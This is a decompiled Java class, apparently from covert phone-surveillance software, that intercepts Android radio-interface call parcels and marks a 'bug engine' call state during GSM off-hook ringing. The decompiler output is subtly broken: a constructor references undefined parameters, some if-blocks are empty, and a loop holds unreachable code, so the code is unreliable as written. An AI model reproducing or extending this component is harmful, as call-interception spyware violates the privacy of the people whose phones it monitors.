package com.vvt.callmanager.filter;

import android.os.Parcel;
import com.vvt.callmanager.a.m;
import com.vvt.callmanager.ref.BugEngineCallState;

 enum FilterGsmCall$CallState$7
{
  private Object transition;
  
  FilterGsmCall$CallState$7()
  {
    super(paramString, paramInt, null);
  }
  
  public void onEnter(Object paramObject)
  {
    boolean bool = FilterGsmCall.b();
    if (bool) {}
    FilterGsmCall.a(this.mFilterCall);
    FilterGsmCall localFilterGsmCall = this.mFilterCall;
    BugEngineCallState localBugEngineCallState = BugEngineCallState.GSM_OFFHOOK_RINGING;
    FilterGsmCall.a(localFilterGsmCall, localBugEngineCallState);
  }
  
  public Object onExit()
  {
    boolean bool = FilterGsmCall.b();
    if (bool) {}
    FilterGsmCall.b(this.mFilterCall);
    return this.transition;
  }
  
  public FilterGsmCall.CallState processResponse(Parcel paramParcel)
  {
    int i = 1;
    Object localObject1 = FilterGsmCall.c(this.mFilterCall);
    int j = ((m)localObject1).c(paramParcel);
    int k = 9;
    Object localObject2;
    if (j == k)
    {
      localObject1 = FilterGsmCall.a(this.mFilterCall, this, paramParcel);
      localObject2 = OFFHOOK;
      if (localObject1 == localObject2) {
        this.transition = paramParcel;
      }
      i = 0;
      localObject2 = null;
    }
    for (;;)
    {
      if (i != 0)
      {
        localObject2 = this.mFilterCall;
        ((FilterGsmCall)localObject2).c(paramParcel);
      }
      return (FilterGsmCall.CallState)localObject1;
      localObject1 = this;
    }
  }
  
  public FilterGsmCall.CallState processRilRequest(Parcel paramParcel)
  {
    FilterGsmCall.c(this.mFilterCall).b(paramParcel);
    this.mFilterCall.d(paramParcel);
    return this;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterGsmCall$CallState$7.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */